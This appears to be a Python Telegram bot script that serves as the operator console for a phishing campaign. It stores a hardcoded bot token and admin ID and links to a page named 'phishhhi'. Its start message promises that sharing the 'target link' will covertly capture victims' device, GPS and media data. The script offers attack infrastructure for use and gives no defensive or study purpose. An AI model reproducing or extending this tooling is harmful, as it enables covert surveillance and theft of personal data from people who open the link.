import telebot

# --- CONFIGURATION ---
TOKEN = '8085353942:AAH-r1yJqPGNvPruBICBW4aFAh2IPJjy_Qw'
ADMIN_ID = '6671784926'
NETLIFY_URL = "https://phishhhi.netlify.app" # Your actual Link
# ---------------------

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def welcome(message):
    if str(message.chat.id) == ADMIN_ID:
        markup = telebot.types.InlineKeyboardMarkup()
        btn = telebot.types.InlineKeyboardButton("🌐 Open Live Site", url=NETLIFY_URL)
        markup.add(btn)
        
        msg = (
            "<b>🔥 v12.0 APEX-OVERLORD ACTIVE</b>\n\n"
            "🛡️ <b>Status:</b> Monitoring Stealth Siphon\n"
            f"🔗 <b>Your Target Link:</b> <code>{NETLIFY_URL}</code>\n\n"
            "<i>Sharing this link will begin capturing Device, GPS, and Media data.</i>"
        )
        bot.send_message(message.chat.id, msg, parse_mode='HTML', reply_markup=markup)
    else:
        bot.send_message(message.chat.id, "❌ Access Denied.")

print("Gold Connection Established. Bot is polling...")
bot.polling()
